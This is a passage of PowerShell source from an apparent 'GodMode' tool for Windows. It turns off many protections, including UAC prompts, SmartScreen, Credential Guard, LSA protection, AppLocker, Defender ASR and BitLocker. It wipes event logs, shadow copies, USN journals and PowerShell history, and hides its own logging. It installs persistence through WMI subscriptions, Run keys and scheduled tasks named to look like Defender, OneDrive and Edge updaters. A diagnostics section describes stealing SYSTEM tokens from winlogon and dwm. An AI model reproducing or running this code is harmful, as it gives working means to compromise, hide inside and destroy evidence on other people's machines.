            Write-Log -Message "Event logs cleared: $Cleared channel(s) cleared, $Failed failed." -Type "INFO" -Color Gray
        }
        Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger" -ErrorAction SilentlyContinue | ForEach-Object {
            Set-ItemProperty -Path $_.PSPath -Name "Start" -Value 0 -Force -ErrorAction SilentlyContinue
        }
        Write-Log -Message "Security auditing disabled and event logs cleared (boot-critical services preserved)." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable security auditing: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: WMI File-less Persistence ---
function Register-GodModeWMI {
    try {
        $WmiName = "Win32ProviderHealthCheck"
        $FilterPath = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            Name = $WmiName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Service'"
        } -ErrorAction SilentlyContinue
        $ConsumerPath = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $WmiName
            CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        } -ErrorAction SilentlyContinue
        if ($FilterPath -and $ConsumerPath) {
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
                Filter = $FilterPath
                Consumer = $ConsumerPath
            } -ErrorAction SilentlyContinue
        }
        Write-Log -Message "WMI persistence registered." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "WMI registration failed: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Self-Destruct Original Payload ---
function Invoke-SelfDestruct {
    param([string]$Path)
    try {
        if (Test-Path $Path) {
            $InstallDirFull = (Get-Item $GodModeInstallDir -ErrorAction SilentlyContinue).FullName
            $TargetFull = (Get-Item $Path -ErrorAction SilentlyContinue).FullName
            $InstalledFull = (Get-Item $GodModeInstallScript -ErrorAction SilentlyContinue).FullName
            # Never delete the installed script itself (scheduled tasks need it)
            if ($InstalledFull -and $TargetFull -and ($TargetFull -eq $InstalledFull)) {
                Write-Log -Message "Self-destruct skipped: $Path is the installed script. Preserved." -Type "INFO" -Color Gray
            } elseif ($InstallDirFull -and $TargetFull -and $TargetFull.StartsWith($InstallDirFull, [System.StringComparison]::OrdinalIgnoreCase)) {
                Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
                Write-Log -Message "Temp payload self-destructed: $Path" -Type "INFO" -Color Gray
            } else {
                Write-Log -Message "Self-destruct skipped: $Path is outside the install directory ($GodModeInstallDir). Source preserved." -Type "INFO" -Color Gray
            }
        }
    } catch { Write-Log -Message "Self-destruct failed: $_" -Type "WARN" -Color Yellow }
}

# --- NEW: Registry Power Functions ---
function Disable-UACPrompts {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "UAC prompts disabled (silent elevation)." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable UAC prompts: $_" -Type "WARN" -Color Yellow }
}

function Disable-SmartScreenRegistry {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" -Name "EnabledV9" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "SmartScreen disabled via registry." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable SmartScreen registry: $_" -Type "WARN" -Color Yellow }
}

function Disable-RemoteUAC {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Remote UAC disabled (full admin tokens over network)." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable Remote UAC: $_" -Type "WARN" -Color Yellow }
}

function Disable-CredentialGuard {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Credential Guard / VBS disabled via registry." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable Credential Guard: $_" -Type "WARN" -Color Yellow }
}

function Disable-WindowsScriptHost {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Windows Script Host disabled via registry." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable WSH: $_" -Type "WARN" -Color Yellow }
}

function Disable-AppLocker {
    try {
        if (-not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2")) { New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -Force | Out-Null }
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -Name "EnforcementMode" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "AppLocker enforcement disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable AppLocker: $_" -Type "WARN" -Color Yellow }
}

function Disable-WindowsSandbox {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SystemGuard" -Name "EnableSecurityMitigations" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Windows Sandbox / Hypervisor-enforced code integrity disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable Windows Sandbox: $_" -Type "WARN" -Color Yellow }
}

function Disable-LSAProtection {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPLBoot" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "LSA protection (RunAsPPL) disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable LSA protection: $_" -Type "WARN" -Color Yellow }
}

function Disable-BitLocker {
    try {
        if (Get-Command Get-BitLockerVolume -ErrorAction SilentlyContinue) {
            $Volumes = Get-BitLockerVolume -ErrorAction SilentlyContinue | Where-Object { $_.ProtectionStatus -eq 'On' }
            foreach ($Vol in $Volumes) {
                Suspend-BitLocker -MountPoint $Vol.MountPoint -RebootCount 0 -ErrorAction SilentlyContinue
                Write-Log -Message "BitLocker suspended on $($Vol.MountPoint)." -Type "INFO" -Color Gray
            }
        } else {
            Write-Log -Message "Get-BitLockerVolume not available; BitLocker suspension skipped." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Failed to suspend BitLocker: $_" -Type "WARN" -Color Yellow }
}

function Disable-ASR {
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -AttackSurfaceReductionRules_Actions @{} -ErrorAction SilentlyContinue
            Set-MpPreference -AttackSurfaceReductionOnlyExclusions @() -ErrorAction SilentlyContinue
            Write-Log -Message "Attack Surface Reduction (ASR) rules disabled." -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "Set-MpPreference not available; ASR disable skipped." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Failed to disable ASR: $_" -Type "WARN" -Color Yellow }
}

function Disable-ControlledFolderAccess {
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue
            Write-Log -Message "Controlled Folder Access disabled." -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "Set-MpPreference not available; Controlled Folder Access disable skipped." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Failed to disable Controlled Folder Access: $_" -Type "WARN" -Color Yellow }
}

function Disable-ExploitGuard {
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -EnableNetworkProtection AuditMode -ErrorAction SilentlyContinue
        } else {
            Write-Log -Message "Set-MpPreference not available; Exploit Guard network protection disable skipped." -Type "WARN" -Color Yellow
        }
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection" -Name "EnableNetworkProtection" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Exploit Guard / Network Protection disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable Exploit Guard: $_" -Type "WARN" -Color Yellow }
}

function Clear-ShadowCopies {
    try {
        vssadmin delete shadows /all /quiet 2>$null | Out-Null
        Write-Log -Message "Volume Shadow Copies cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear shadow copies: $_" -Type "WARN" -Color Yellow }
}

function Clear-USNJournal {
    try {
        $Drives = Get-Volume -ErrorAction SilentlyContinue | Where-Object { $_.DriveLetter } | Select-Object -ExpandProperty DriveLetter
        foreach ($D in $Drives) {
            fsutil usn deletejournal /d "${D}:" 2>$null | Out-Null
        }
        Write-Log -Message "USN journals cleared on active drives." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear USN journal: $_" -Type "WARN" -Color Yellow }
}

function Clear-CrashDumps {
    try {
        Remove-Item -Path "C:\Windows\Minidump\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "C:\Windows\Memory.dmp" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:LOCALAPPDATA\CrashDumps\*" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Crash dumps cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear crash dumps: $_" -Type "WARN" -Color Yellow }
}

function Clear-PowerShellHistory {
    try {
        $HistoryPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($HistoryPath -and (Test-Path $HistoryPath)) {
            Clear-Content -Path $HistoryPath -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $HistoryPath -Force -ErrorAction SilentlyContinue
        }
        # Also clear the older PS5 history path
        $OldHistory = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if (Test-Path $OldHistory) {
            Clear-Content -Path $OldHistory -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $OldHistory -Force -ErrorAction SilentlyContinue
        }
        Write-Log -Message "PowerShell history cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear PowerShell history: $_" -Type "WARN" -Color Yellow }
}

function Clear-RecentTraces {
    try {
        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db" -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Recent files, Jump Lists, and thumbnail caches cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear recent traces: $_" -Type "WARN" -Color Yellow }
}

function Invoke-StealthMode {
    Write-DebugLog -FunctionName "Invoke-StealthMode" -Action "ENTRY"
    try {
        # Hide window title from casual inspection
        $Host.UI.RawUI.WindowTitle = "Windows PowerShell (x86)"
        # MainWindowTitle is read-only on some processes; skip direct assignment to avoid runtime error
        
        # Suppress script-block logging and transcription via registry (if not already hardened)
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Stealth mode applied: window title masked, PowerShell logging suppressed." -Type "INFO" -Color Gray
        Write-DebugLog -FunctionName "Invoke-StealthMode" -Action "EXIT" -Message "Success"
    } catch {
        Write-DebugLog -FunctionName "Invoke-StealthMode" -Action "ERROR" -Message "Partial failure" -ErrorRecord $_
        Write-Log -Message "Stealth mode partial failure: $_" -Type "WARN" -Color Yellow
    }
}

function Register-DeepPersistence {
    Write-DebugLog -FunctionName "Register-DeepPersistence" -Action "ENTRY"
    try {
        # Extra registry Run keys (both HKLM and WOW6432Node)
        $ScriptCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        Set-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        
        # Additional scheduled tasks with different names
        $ExtraPrefixes = @("WindowsDefenderSigUpdates_", "OneDriveStandaloneUpdater_", "EdgeWebView2Updater_")
        foreach ($Prefix in $ExtraPrefixes) {
            # Skip if any task with this prefix already exists (idempotent)
            if (Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue) {
                Write-Log -Message "Deep persistence task prefix $Prefix already exists; skipping." -Type "INFO" -Color Gray
                continue
            }
            $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
            Write-Log -Message "Deep persistence task $taskName registered." -Type "INFO" -Color Gray
        }
        
        # WMI boot-level persistence (low-frequency service-modification trigger).
        # NOTE: Win32_ProcessStartupTrace was used previously but fires on EVERY
        # process start, spawning hundreds of -ToggleOn PowerShell processes and
        # constantly killing the Start-Monitoring loop via Register-StealthTask.
        # Switched to a 300-second service-modification poll which is sufficient
        # as a periodic re-trigger without causing monitoring-loop flapping.
        $WmiName = "Win32BootHealthCheck"
        $FilterPath = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            Name = $WmiName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_Service'"
        } -ErrorAction SilentlyContinue
        $ConsumerPath = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $WmiName
            CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        } -ErrorAction SilentlyContinue
        if ($FilterPath -and $ConsumerPath) {
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter = $FilterPath; Consumer = $ConsumerPath} -ErrorAction SilentlyContinue | Out-Null
        }
        
        Write-Log -Message "Deep persistence registered: extra registry keys, backup tasks, and boot-level WMI." -Type "INFO" -Color Gray
        Write-DebugLog -FunctionName "Register-DeepPersistence" -Action "EXIT" -Message "Success"
    } catch {
        Write-DebugLog -FunctionName "Register-DeepPersistence" -Action "ERROR" -Message "Registration failed" -ErrorRecord $_
        Write-Log -Message "Deep persistence registration failed: $_" -Type "WARN" -Color Yellow
    }
}

function Get-GodModeElevationPathDiagnostics {
    # Option-11 (Export-GodModeLogs) companion: captures the MONITOR / SHELL-ELEVATION
    # PATH live state that the gmproxy/IFEO-centric dump historically omitted -- the
    # blind spot that left "shells stay admin after [7]+reboot" undiagnosable from the
    # dump alone. The monitor (Start-Monitoring) runs as SYSTEM (Session 0, via the
    # stealth scheduled task GodMode.ps1 -Launch) and logs via Write-Log to
    # $env:TEMP\DNS_Lockdown_Enterprise.log -- which as SYSTEM resolves to
    # C:\Windows\Temp, NOT the admin user's $env:TEMP that Export-GodModeLogs reads by
    # default. So the monitor's own "Monitoring started" / "Monitor elevated: cmd
    # PID=..." / error lines were NEVER collected, and no live task/process/flag/token
    # state was captured. This function returns a single string (the whole
    # MONITOR / SHELL-ELEVATION PATH section) for Export-GodModeLogs to append.
    # Best-effort throughout: every probe is try/catch guarded so a missing/ACL-denied
    # probe prints a [probe failed] line instead of throwing (the dump never fails
    # half-written). Reuses Test-GodModeActive / Find-SystemProcessCandidate so the
    # diagnostics reflect the SAME logic the monitor uses.
    $sec = @()
    $sec += "===== MONITOR / SHELL-ELEVATION PATH ====="
    $sec += "Generated: $(Get-Date)"

    # --- A. Dump context (who option 11 runs as -- decides which logs SHOULD exist) ---
    try {
        $curId = [Security.Principal.WindowsIdentity]::GetCurrent()
        $curSid = $curId.User.Value
        $curIsAdmin = ([Security.Principal.WindowsPrincipal]$curId).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        $curIsBuiltIn = ($curSid -like "*-500")
        $curIsSystem = ($curSid -eq "S-1-5-18")
        $sec += "----- DUMP CONTEXT -----"
        $sec += "User            : $($curId.Name)"
        $sec += "SID             : $curSid"
        $sec += "IsAdmin         : $curIsAdmin"
        $sec += "IsBuiltInAdmin  : $curIsBuiltIn"
        $sec += "IsSystem        : $curIsSystem"
        $sec += "PSVersion       : $($PSVersionTable.PSVersion)"
        $sec += "DumpPID         : $PID"
        $sec += "DumpTEMP        : $env:TEMP"
        $sec += "NOTE: Export-GodModeLogs reads `$env:TEMP\DNS_Lockdown_Enterprise.log (this dump's temp)."
        $sec += "      The MONITOR runs as SYSTEM and logs to C:\Windows\Temp\DNS_Lockdown_Enterprise.log"
        $sec += "      (collected in the SYSTEM-TEMP LOGS section above). If those are empty/missing,"
        $sec += "      the monitor is NOT running as SYSTEM after reboot -- the root cause of"
        $sec += "      'whoami -> admin' for cmd/powershell launched normally."
    } catch { $sec += "[DUMP CONTEXT probe failed: $_]" }

    # --- B. God Mode active flag ---
    try {
        $flagActive = Test-GodModeActive
        $flagRaw = $null
        try { $flagRaw = (Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue).$GodModeFlagRegName } catch {}
        $sec += "----- GOD MODE ACTIVE FLAG -----"
        $sec += "Test-GodModeActive : $flagActive"
        $sec += "Raw flag value     : $(if ($null -ne $flagRaw) { $flagRaw } else { '[missing/key not found]' })"
        $sec += "RegPath            : $GodModeFlagRegPath"
        $sec += "RegName            : $GodModeFlagRegName"
    } catch { $sec += "[GOD MODE FLAG probe failed: $_]" }

    # --- C. God Mode scheduled tasks (stealth / main / guardian / watchdog / backup) ---
    # LastTaskResult is the key signal: 0 = the task action ran clean; nonzero = the
    # monitor launch FAILED (PS5->PS7 relaunch error in Session 0, script parse error,
    # or an early Exit). A stealth task in state Ready with a nonzero LastTaskResult
    # means the monitor was launched and DIED -- interactive shells will never
    # auto-elevate. State=Running means the Start-Monitoring loop is alive right now.
    try {
        $sec += "----- SCHEDULED TASKS (monitor launch path) -----"
        $taskSpecs = @(
            @{ Label = "STEALTH (monitor -Launch)"; Filter = "$GodModeTaskPrefix*" }
            @{ Label = "MAIN (-ToggleOn)";           Exact  = $GodModeTaskName }
            @{ Label = "GUARDIAN (-ToggleOn 5m)";    Exact  = $GodModeGuardianName }
            @{ Label = "WATCHDOG (30s heartbeat)";   Exact  = $GodModeWatchdogName }
            @{ Label = "BACKUP GoogleUpdateTask_";   Filter = "GoogleUpdateTask_*" }
            @{ Label = "BACKUP ChromeUpdater_";      Filter = "ChromeUpdater_*" }
            @{ Label = "BACKUP OneDriveSyncTask_";   Filter = "OneDriveSyncTask_*" }
        )
        foreach ($spec in $taskSpecs) {
            $tasks = @()
            if ($spec.Filter) { $tasks = @(Get-ScheduledTask -TaskName $spec.Filter -ErrorAction SilentlyContinue) }
            elseif ($spec.Exact) { $t = Get-ScheduledTask -TaskName $spec.Exact -ErrorAction SilentlyContinue; if ($t) { $tasks = @($t) } }
            if ($tasks.Count -eq 0) {
                $sec += "  [$($spec.Label)] NOT FOUND"
                continue
            }
            $sec += "  [$($spec.Label)] $($tasks.Count) task(s):"
            foreach ($t in $tasks) {
                $info = $null
                try { $info = $t | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue } catch {}
                $principal = ""
                try { $principal = $t.Principal.UserId } catch {}
                $actExec = ""; $actArgs = ""
                try { if ($t.Actions) { $actExec = $t.Actions[0].Execute; $actArgs = $t.Actions[0].Arguments } } catch {}
                $lastRun = "n/a"; $lastResult = "n/a"; $nextRun = "n/a"
                try { if ($info) { $lastRun = $info.LastRunTime; $lastResult = $info.LastTaskResult; $nextRun = $info.NextRunTime } } catch {}
                $sec += "    - Name=$($t.TaskName)"
                $sec += "      State=$($t.State)  Principal=$principal"
                $sec += "      LastRunTime=$lastRun  LastTaskResult=$lastResult  NextRunTime=$nextRun"
                $sec += "      Action=$actExec $actArgs"
            }
        }
        $sec += "NOTE: LastTaskResult=0 => task action ran clean. Nonzero (e.g. 1, 0xC0000142,"
        $sec += "      267009) => the monitor launch FAILED. State=Ready + nonzero result = the"
        $sec += "      monitor was launched and exited/died -- the stealth task action must STAY"
        $sec += "      alive in the Start-Monitoring loop for shells to auto-elevate."
    } catch { $sec += "[SCHEDULED TASKS probe failed: $_]" }

    # --- D. Live monitor process (is a Start-Monitoring loop alive RIGHT NOW?) ---
    try {
        $sec += "----- LIVE MONITOR PROCESS -----"
        $allProcs = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue)
        $monitorPids = @()
        foreach ($p in $allProcs) {
            $nm = "$($p.Name)".ToLower()
            if ($nm -notin @("powershell.exe","pwsh.exe","cmd.exe")) { continue }
            $cmd = "$($p.CommandLine)"
            if (-not $cmd) { continue }
            if ($cmd -match "GodMode\.ps1" -or $cmd -match "-Launch" -or $cmd -match "God-Mode-Windows\.ps1") {
                $owner = "n/a"
                try { $o = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction SilentlyContinue; if ($o -and $o.User) { $owner = "$($o.Domain)\$($o.User)" } } catch {}
                $isMon = ($cmd -match "GodMode\.ps1" -and $cmd -match "-Launch")
                $tag = if ($isMon) { "<== MONITOR LOOP (GodMode.ps1 -Launch)" } else { "plumbing" }
                $cmdTrim = if ($cmd.Length -gt 200) { $cmd.Substring(0,200) + "..." } else { $cmd }
                $sec += "  PID=$($p.ProcessId) Name=$($p.Name) Session=$($p.SessionId) Owner=$owner $tag"
                $sec += "    CmdLine: $cmdTrim"
                if ($isMon) { $monitorPids += $p.ProcessId }
            }
        }
        if ($monitorPids.Count -eq 0) {
            $sec += "  [NO LIVE MONITOR LOOP -- no powershell/pwsh running 'GodMode.ps1 -Launch'."
            $sec += "   This is the #1 cause of shells staying admin: the monitor is not running, so"
            $sec += "   the WMI watcher + 5s polling never elevate interactive shells.]"
        } else {
            $sec += "  [MONITOR LOOP ALIVE: PID(s) $($monitorPids -join ', ')]"
        }
    } catch { $sec += "[LIVE MONITOR PROCESS probe failed: $_]" }

    # --- E. Running interactive shells + owner identity (GROUND TRUTH: admin vs SYSTEM) ---
    try {
        $sec += "----- RUNNING INTERACTIVE SHELLS (admin vs SYSTEM ground truth) -----"
        $shellNames = @("cmd.exe","powershell.exe","pwsh.exe","powershell_ise.exe")
        $shells = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $shellNames -contains "$($_.Name)".ToLower() })
        if ($shells.Count -eq 0) {
            $sec += "  [No cmd/powershell/pwsh/ISE running -- launch one then re-dump to see its owner]"
        }
        $sysCount = 0; $adminCount = 0
        foreach ($p in $shells) {
            $owner = "n/a"; $isSys = $false
            try { $o = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction SilentlyContinue; if ($o -and $o.User) { $owner = "$($o.Domain)\$($o.User)"; $isSys = ("$($o.User)" -eq "SYSTEM") } } catch {}
            if ($isSys) { $sysCount++ } else { $adminCount++ }
            $cmdTrim = ""
            try { $c = "$($p.CommandLine)"; $cmdTrim = if ($c.Length -gt 160) { $c.Substring(0,160) + "..." } else { $c } } catch {}
            $verdict = if ($isSys) { "SYSTEM" } else { "NOT-SYSTEM (admin/user)" }
            $sec += "  PID=$($p.ProcessId) Name=$($p.Name) Session=$($p.SessionId) Owner=$owner -> $verdict"
            $sec += "    CmdLine: $cmdTrim"
        }
        $sec += "  SUMMARY: $sysCount SYSTEM shell(s), $adminCount non-SYSTEM shell(s)."
        $sec += "  If your cmd/powershell shows NOT-SYSTEM here, the monitor did not elevate it."
    } catch { $sec += "[INTERACTIVE SHELLS probe failed: $_]" }

    # --- F. SYSTEM token source (what the monitor steals from) + donor inventory ---
    try {
        $sec += "----- SYSTEM TOKEN SOURCE -----"
        $cand = 0
        try { $cand = Find-SystemProcessCandidate } catch {}
        $sec += "  Find-SystemProcessCandidate -> PID=$cand  $(if ($cand -gt 0) { '(a SYSTEM token source IS available)' } else { '(NO SYSTEM token source -- shells CANNOT be elevated!)' })"
        # gmproxy's priority SYSTEM-token donors (gmproxy.c FindSystemProcessForToken
        # priorityNames): winlogon / dwm / fontdrvhost. Sort these FIRST so the 25-row
        # cap below always surfaces them (they are the donors gmproxy actually prefers).
        $priorityDonors = @('winlogon.exe','dwm.exe','fontdrvhost.exe')
        $sysProcs = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
            Where-Object { $_.SessionId -gt 0 -and $_.ProcessId -gt 4 } |
            Sort-Object @{ Expression = { if ($priorityDonors -contains $_.Name) { 0 } else { 1 } } }, SessionId)
        $shown = 0
        $donorOpenable = 0; $donorDenied = 0; $donorPriorityOpenable = 0; $donorPriorityDenied = 0
        foreach ($p in $sysProcs) {
            if ($shown -ge 25) { break }
            $owner = "n/a"
            try { $o = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction SilentlyContinue; if ($o -and $o.User) { $owner = "$($o.User)" } } catch {}
            if ("$owner" -eq "SYSTEM") {
                # Read-only donor-usability probe (mirrors gmproxy.c IsOpenableSystemProcess via
                # the SAME [TokenOps]::TestOpenProcess Find-SystemProcessCandidate uses): opens
                # PROCESS_QUERY_LIMITED_INFORMATION, opens+duplicates the token, then closes every
                # handle. NO kill, NO retained handle -- purely a query. Tags each SYSTEM process
                # [OPENABLE] (gmproxy can steal a session-correct SYSTEM token from it) vs
                # [PPL/DENIED] (OpenProcess / token-duplicate failed -> PPL-protected or ACL-
                # denied) vs [?] (probe threw). Priority donors get <<priority. Tally totals.
                $openable = $null
                try { $openable = [TokenOps]::TestOpenProcess($p.ProcessId) } catch { $openable = $null }
                $tag = if ($null -eq $openable) { '[?]' } elseif ($openable) { '[OPENABLE]' } else { '[PPL/DENIED]' }
                $isPriority = ($priorityDonors -contains $p.Name)
                if ($isPriority) { $tag += ' <<priority' }
                if ($openable) {
                    $donorOpenable++
                    if ($isPriority) { $donorPriorityOpenable++ }
                } else {
                    $donorDenied++
                    if ($isPriority) { $donorPriorityDenied++ }
                }
                $sec += "  PID=$($p.ProcessId) Name=$($p.Name) Session=$($p.SessionId) Owner=SYSTEM $tag"
                $shown++
            }
        }
        if ($shown -eq 0) { $sec += "  [No Session>0 SYSTEM processes found -- winlogon/dwm not SYSTEM? PPL?]" }
        $sec += "  DONOR INVENTORY: openable=$donorOpenable denied=$donorDenied priority_openable=$donorPriorityOpenable priority_denied=$donorPriorityDenied (of $shown SYSTEM row(s) shown)"
        if ($donorPriorityOpenable -gt 0) {
            $sec += "  -> gmproxy CAN steal a session-correct SYSTEM token from a priority donor (winlogon/dwm/fontdrvhost) -- SYSTEM elevation should succeed."
        } elseif ($donorOpenable -gt 0) {
            $sec += "  -> No priority donor is openable, but another Session>0 SYSTEM process is -- gmproxy falls back to it (FindSystemProcessForToken anyHit)."
